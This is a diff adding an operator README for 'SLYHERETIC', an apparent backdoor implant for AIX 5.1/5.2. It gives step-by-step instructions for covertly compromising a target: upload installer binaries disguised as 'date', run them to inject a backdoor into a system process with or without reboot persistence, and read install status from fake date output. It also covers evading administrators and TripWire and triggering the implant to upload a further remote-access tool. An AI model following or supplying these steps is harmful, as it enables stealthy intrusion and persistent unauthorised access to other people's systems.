@@ -1,0 +1,70 @@
+#########################################################
+#  SLYHERETIC v1.0.5.0
+#########################################################
+### SLYHERETIC is a light-weight implant for AIX 5.1 and AIX 5.2 Uses Hide-in-Plain-Sight techniques to provide stealth.
+### SlyHeretic_Persistent: This installer injects a backdoor into a system process and persists across system reboots.
+### SlyHeretic_OneShot: This installer injects a backdoor into a system process and does not persist across system reboots.
+### All SLYHERETIC binaries delete themselves upon execution.
+
+**IMPORTANT: SINCE SLYHERETIC Uses Hide-in-Plain-Sight techniques to provide stealth ensure that you get off of box if known administrators are on the box.**
+**IMPORTANT: Do not install SLYHERETIC on systems where TripWire is installed. ***********************************
+
+
+######################################################### Persistent Install######################################################################
+## To install the Persistent version of SLYHERETIC perform the following steps.
+
+## Upload the SlyHeretic_Persistent binary to the target with the name 'date' on a filesystem that's not mounted noexec.
+-put /current/up/SlyHeretic_Persistent date
+
+### Execute the installer with the following command: 
+PATH=. date
+## Check the installer error code by looking at the 'date' string reported. The installer will report a 'date' string with the
+## seconds field as the error code. If the seconds field reports '00', the installation was successful.
+
+If you get an error code in the seconds field start the troubleshooting. The most common error that you might receive is the '09' error.
+This error means that no viable injection process is available at that particuliar time installation time. SLYHERETIC checks the process state prior to 
+injecting so it may determine that no process are good candiates for injection. Wait a minute and try the install again. If that does not work contact 
+tool champion or developer.   
+
+########################################################## OneShot Install##########################################################################
+## Upload the SlyHeretic_OneShot binary to the target with the name 'date' on a filesystem that's not mounted noexec.
+
+-put /current/up/SlyHeretic_OneShot date
+
+### Execute the installer with the following command: 
+PATH=. date
+## Check the installer error code by looking at the 'date' string reported. The installer will report a 'date' string with the
+## seconds field as the error code. If the seconds field reports '00', the installation was successful.
+
+If you get an error code in the seconds field start the troubleshooting. The most common error that you might receive is the '09' error.
+This error means that no viable injection process is available at that particuliar time installation time. SLYHERETIC checks the process state prior to 
+injecting so it may determine that no process are good candiates for injection. Wait a minute and try the install again. If that does not work contact 
+tool champion or developer.   
+
+
+#############################################################Uninstalling SLYHERETIC######################################################################
+## Upload the SlyHeretic_Uninstaller binary to the target with the name 'date' on a filesystem that's not mounted noexec.
+
+-put /current/up/SlyHeretic_Uninstaller  date
+
+### Execute the installer with the following command: 
+PATH=. date
+
+The Uninstaller will not provide any out stating that the uninstall was successful.
+To verify uninstall you can attempt to trigger via tipoff or -irtun.
+
+
+#########################################################SLYHERETIC REINSTALL############################################################################
+SLYHERETIC can be reinstalled on a system but only after an Uninstall has taken place. A reinstall is simply the following steps:
+Uninstall SLYHERETIC
+Install SLYHERETIC
+
+
+######################################################### TRIGGERING SLYHERETIC #########################################################################
+## Trigger SLYHERETIC and upload NOPEN with redirection.
+
+-irtun TARGET_IP RANDOM_PORT -ueY5 ********SLYHERETIC uses DewDrop 3.X trigger**********************************
+
+
+
+
